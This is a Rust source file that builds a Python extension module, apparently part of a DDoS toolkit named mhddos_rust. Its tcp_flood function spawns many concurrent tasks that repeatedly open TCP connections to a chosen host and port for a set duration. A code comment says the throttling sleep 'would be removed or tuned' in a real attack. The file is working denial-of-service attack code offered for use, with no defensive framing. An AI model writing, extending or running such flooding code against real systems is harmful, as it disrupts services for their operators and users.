use pyo3::prelude::*;
use tokio::net::TcpStream;
use tokio::time::{sleep, Duration};
use std::sync::Arc;
use tokio::sync::mpsc;
use rand::Rng;

#[pyfunction]
fn tcp_flood(target: String, port: u16, threads: usize, duration: u64) -> PyResult<()> {
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(async {
        let target = Arc::new(target);
        let mut handlers = vec![];

        for _ in 0..threads {
            let target = Arc::clone(&target);
            let handler = tokio::spawn(async move {
                let start = std::time::Instant::now();
                while start.elapsed().as_secs() < duration {
                    if let Ok(_stream) = TcpStream::connect(format!("{}:{}", target, port)).await {
                        // Success, connection made
                    }
                    // Minimal sleep to prevent OS socket exhaustion locally during testing
                    // In real attack, this would be removed or tuned
                    sleep(Duration::from_millis(1)).await;
                }
            });
            handlers.push(handler);
        }

        for h in handlers {
            let _ = h.await;
        }
    });
    Ok(())
}

#[pymodule]
fn mhddos_rust(_py: Python, m: &PyModule) -> PyResult<()> {
    m.add_function(wrap_pyfunction!(tcp_flood, m)?)?;
    Ok(())
}
